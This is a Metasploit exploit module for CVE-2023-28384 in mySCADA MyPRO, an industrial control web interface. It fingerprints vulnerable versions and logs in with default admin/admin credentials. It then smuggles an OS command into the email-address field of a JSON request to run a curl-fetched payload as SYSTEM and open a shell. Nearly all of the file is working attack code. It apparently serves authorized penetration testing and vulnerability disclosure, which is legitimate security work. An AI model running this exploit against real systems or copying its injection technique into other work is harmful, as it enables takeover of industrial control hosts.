class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'mySCADA MyPRO Authenticated Command Injection (CVE-2023-28384)',
        'Description' => %q{
          Authenticated Command Injection in MyPRO <= v8.28.0 from mySCADA.
          The vulnerability can be exploited by a remote attacker to inject arbitrary operating system commands which will get executed in the context of NT AUTHORITY\SYSTEM.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Michael Heinzl'], # Vulnerability discovery & MSF module
        'References' => [
          [ 'URL', 'https://www.cisa.gov/news-events/ics-advisories/icsa-23-096-06'],
          [ 'CVE', '2023-28384']
        ],
        'DisclosureDate' => '2022-09-22',
        'Platform' => 'win',
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Windows_Fetch',
            {
              'Arch' => [ ARCH_CMD ],
              'Platform' => 'win',
              'DefaultOptions' => { 'FETCH_COMMAND' => 'CURL' },
              'Type' => :win_fetch
            }
          ]
        ],
        'DefaultTarget' => 0,

        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new(
          'USERNAME',
          [ true, 'The username to authenticate with (default: admin)', 'admin' ]
        ),
        OptString.new(
          'PASSWORD',
          [ true, 'The password to authenticate with (default: admin)', 'admin' ]
        ),
        OptString.new(
          'TARGETURI',
          [ true, 'The URI for the MyPRO web interface', '/' ]
        )
      ]
    )
  end

  # Determine if the MyPRO instance runs a vulnerable version
  def check
    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'l.fcgi'),
        'vars_post' => {
          't' => '98'
        }
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      return CheckCode::Unknown
    ensure
      disconnect
    end

    if res && res.code == 200
      regex = /\{.*\}/m
      json_body = res.body[regex, 0]
      data = JSON.parse(json_body)
      version = data['V']
      if version.nil?
        return CheckCode::Unknown
      else
        vprint_status('Version retrieved: ' + version)
      end

      parts = version.split('.')
      major = parts[0]
      minor = parts[1]
      if major.to_i == 8 && minor.to_i <= 28
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    else
      return CheckCode::Unknown
    end
  end

  def exploit
    connect
    case target['Type']
    when :win_fetch
      execute_command(payload.encoded)
    end
  end

  def execute_command(cmd)
    print_status('Checking credentials...')
    check_auth
    print_status('Sending command injection...')
    exec_mypro(cmd)
    print_status('Exploit finished, check thy shell.')
    handler
  end

  # Check if credentials are working
  def check_auth
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'sss2'),
      'headers' => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      }
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    if res && res.code == 401
      fail_with(Failure::NoAccess, 'Unauthorized access. Are your credentials correct?')
    end
    if res && res.code == 200
      print_good('Credentials are working.')
    end
  end

  # Send command injection
  def exec_mypro(cmd)
    # Generating a random email address
    addr = "#{Rex::Text.rand_text_alphanumeric(3..12)}@#{Rex::Text.rand_text_alphanumeric(4..8)}.com"

    print_status("Using randomly generated email address: #{addr}")

    post_data = {
      'type' => 'sendEmail',
      'addr' => 'addr' + '"&&' + cmd
    }
    post_json = JSON.generate(post_data)

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => post_json,
      'uri' => normalize_uri(target_uri.path, 'sss2'),
      'headers' => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      }

    })

    # unless res # We don't fail from this check because the server will wait until the injected command got executed before returning a response. Typically, this will simply result in a 504 Gateway Time-out error after some time, but there is no indication on whether the injected payload got successfully executed or not from the server response.
    #   print_status("Failed to receive a reply from the server, probably waiting on injected command to finish. Check if you got a shell already.")
    # end

    if res && res.code == 200 # If the injected command executed and terminated within the timeout, a HTTP status code of 200 is returned.
      print_good('Command successfully executed, check your shell.')
    end
  end

end
